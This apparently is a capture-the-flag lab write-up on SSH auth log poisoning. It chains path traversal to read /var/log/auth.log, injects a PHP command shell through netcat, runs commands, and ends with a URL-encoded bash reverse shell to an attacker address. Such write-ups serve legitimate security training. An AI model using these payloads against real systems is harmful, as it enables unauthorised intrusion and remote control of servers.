---
layout: default
title: Log Poisoning
parent: Web Exploits
nav_order: 2
---

# Log Poisoning

---

## SSH Auth Log Poisoning

Check if _/var/log/auth.log_ is visible.

```bash
URL: http://192.168.202.80/console/file.php?file=../../../../../../../var/log/auth.log
```

![ssh_log](../../../assets/images/ctfs/proving_grounds/ha_natraj/ssh_log.png)

Process for testing SSH auth log poisoning and RCE:

1. Netcat verbose to the target on port 22
2. Send malicious php code
3. Verify SSH auth log poisoning successful
4. Execute RCE with PHP cmd shell via poisoned log

Send PHP cmd shell through SSH via Netcat.

```bash
# netcat verbose to target on port 22
nc -nv 192.168.202.80 22

# send malicious php code
pwn_code/<?php passthru($_GET['cmd']); ?>
```

Verify SSH auth log is poisoned.

![ssh_poison](../../../assets/images/ctfs/proving_grounds/ha_natraj/ssh_poison.png)

Execute RCE with PHP cmd shell via poisoned log.

```bash
URL: http://192.168.202.80/console/file.php?file=../../../../../../../var/log/auth.log&cmd=id
```

![cmd_rce](../../../assets/images/ctfs/proving_grounds/ha_natraj/cmd_rce.png)

Get reverse shell with URL encoded bash one-liner

```bash
URL: 192.168.202.80/console/file.php?file=../../../../../../../var/log/auth.log&cmd=bash -c "bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.217%2F9001%200%3E%261"
```

![rev_shell](../../../assets/images/ctfs/proving_grounds/ha_natraj/rev_shell.png)
